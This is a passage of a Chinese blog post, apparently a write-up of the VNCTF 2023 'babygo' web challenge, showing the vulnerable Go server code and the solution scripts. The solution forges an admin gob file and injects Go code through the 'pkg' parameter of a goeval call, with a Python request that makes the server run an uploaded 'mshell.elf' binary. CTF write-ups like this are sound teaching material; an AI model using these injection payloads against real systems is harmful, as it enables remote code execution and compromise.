r.GET(&quot;/upload&quot;, func(c *gin.Context) &#123;</span><br><span class="line">		c.HTML(200, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;upload me!&quot;&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(&quot;/upload&quot;, func(c *gin.Context) &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		if session.Get(&quot;shallow&quot;) == nil &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, &quot;/&quot;)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot;</span><br><span class="line">		fileutil.CreateDir(userUploadDir)</span><br><span class="line">		file, err := c.FormFile(&quot;file&quot;)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;no file upload&quot;&#125;)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		ext := file.Filename[strings.LastIndex(file.Filename, &quot;.&quot;):]</span><br><span class="line">		if ext == &quot;.gob&quot; || ext == &quot;.go&quot; &#123;</span><br><span class="line">			c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;Hacker!&quot;&#125;)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		filename := userUploadDir + file.Filename</span><br><span class="line">		if fileutil.IsExist(filename) &#123;</span><br><span class="line">			fileutil.RemoveFile(filename)</span><br><span class="line">		&#125;</span><br><span class="line">		err = c.SaveUploadedFile(file, filename)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to save file&quot;&#125;)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(200, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;file saved to &quot; + filename&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(&quot;/unzip&quot;, func(c *gin.Context) &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		if session.Get(&quot;shallow&quot;) == nil &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, &quot;/&quot;)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot;</span><br><span class="line">		files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">		destPath := filepath.Clean(userUploadDir + c.Query(&quot;path&quot;))</span><br><span class="line">		for _, file := range files &#123;</span><br><span class="line">			if fileutil.MiMeType(userUploadDir+file) == &quot;application/zip&quot; &#123;</span><br><span class="line">				err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">				if err != nil &#123;</span><br><span class="line">					c.HTML(200, &quot;zip.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to unzip file&quot;&#125;)</span><br><span class="line">					return</span><br><span class="line">				&#125;</span><br><span class="line">				fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(200, &quot;zip.html&quot;, gin.H&#123;&quot;message&quot;: &quot;success unzip&quot;&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(&quot;/backdoor&quot;, func(c *gin.Context) &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		if session.Get(&quot;shallow&quot;) == nil &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, &quot;/&quot;)</span><br><span class="line">		&#125;</span><br><span class="line">		userDir := session.Get(&quot;shallow&quot;).(string)</span><br><span class="line">		if fileutil.IsExist(userDir + &quot;user.gob&quot;) &#123;</span><br><span class="line">			file, _ := os.Open(userDir + &quot;user.gob&quot;)</span><br><span class="line">			decoder := gob.NewDecoder(file)</span><br><span class="line">			var ctfer User</span><br><span class="line">			decoder.Decode(&amp;ctfer)</span><br><span class="line">			if ctfer.Power == &quot;admin&quot; &#123;</span><br><span class="line">				eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))</span><br><span class="line">				if err != nil &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">				&#125;</span><br><span class="line">				c.HTML(200, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: string(eval)&#125;)</span><br><span class="line">				return</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				c.HTML(200, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: &quot;low power&quot;&#125;)</span><br><span class="line">				return</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			c.HTML(500, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: &quot;no such user gob&quot;&#125;)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.Run(&quot;:8080&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//encode0.go</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">	&quot;encoding/gob&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">)</span><br><span class="line">type User struct &#123;</span><br><span class="line">	Name  string</span><br><span class="line">	Path  string</span><br><span class="line">	Power string</span><br><span class="line">&#125;</span><br><span class="line">func encode() &#123;</span><br><span class="line">	user := User&#123;Name: &quot;ctfer&quot;, Path: &quot;/tmp/a39f682dbf98f61bcbbb7b144a9bf145/&quot;, Power: &quot;admin&quot;&#125;</span><br><span class="line">	filePtr, _ := os.Create(&quot;user.gob&quot;)</span><br><span class="line">	encoder := gob.NewEncoder(filePtr)</span><br><span class="line">	encoder.Encode(&amp;user)</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line">	encode()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//goeval0.go</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;github.com/PaulXu-cn/goeval&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">	pkg := &quot;fmt\&quot;\n\&quot;os/exec\&quot;\n)\nfunc\tinit()&#123;\ncmd:=exec.Command(\&quot;dir\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\nvar\t(\na=\&quot;1&quot;</span><br><span class="line">	//pkg = &quot;\&quot;os/exec\&quot;\n fmt\&quot;\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\&quot;dir\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\n\n\nvar(a=\&quot;1&quot;</span><br><span class="line">	//pkg = &quot;fmt\&quot;\n)\nfunc\tinit()&#123;\nfmt.Print(\&quot;我是init\&quot;)\n&#125;\nvar\t(\na=\&quot;1&quot;</span><br><span class="line">	res, _ := goeval.Eval(&quot;&quot;, &quot;fmt.Print(\&quot;123\&quot;)&quot;, pkg)</span><br><span class="line"></span><br><span class="line">	fmt.Println(string(res))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#2.py</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">cookies = &#123;&quot;session&quot;:&quot;MTY3NzMwMDYwMHxEdi1CQkFFQ180SUFBUkFCRUFBQVJfLUNBQUVHYzNSeWFXNW5EQWtBQjNOb1lXeHNiM2NHYzNSeWFXNW5EQ2dBSmk5MGJYQXZZVE01WmpZNE1tUmlaams0WmpZeFltTmlZbUkzWWpFME5HRTVZbVl4TkRVdnzAZDGCnyxMNEDUMsPtUIKzyZEmPpO0BRqsvA8AE6aKWA==&quot;&#125;</span><br><span class="line">pkg = &quot;\&quot;os/exec\&quot;\n fmt\&quot;\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\&quot;./mshell.elf\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\n\n\nvar(a=\&quot;1&quot;</span><br><span class="line">url = f&#x27;http://474bce15-c3d7-4395-a841-2dca0f599f60.node4.buuoj.cn:81/backdoor?pkg=&#123;pkg&#125;&#x27;</span><br><span class="line">headers = &#123;&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url, cookies=cookies,headers=headers).text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/ctf/">#ctf</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/03/05/20%E5%9C%A8linux%E4%B8%8A%E4%BD%BF%E7%94%A8clash%E7%9A%84%E5%AE%8C%E7%BE%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">在linux上使用clash的完美解决方案</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/02/22/18venom+proxychains-%E4%BD%BF%E7%94%A8nmap/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">venom+proxychains 使用nmap</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2023VNCTF%E5%A4%8D%E7%8E%B0"><span class="nav-text">2023VNCTF复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%89%8D%E8%A8%80"><span class="nav-text">1.前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-VNCTF-misc-%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="nav-text">2.VNCTF-misc-[验证码]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-VNCTF-misc-LSSTIB"><span class="nav-text">3.VNCTF-misc-[LSSTIB]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-VNCTF-web-babygo"><span class="nav-text">4.VNCTF-web-[babygo]</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">lhb</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+
+</body>
+</html>
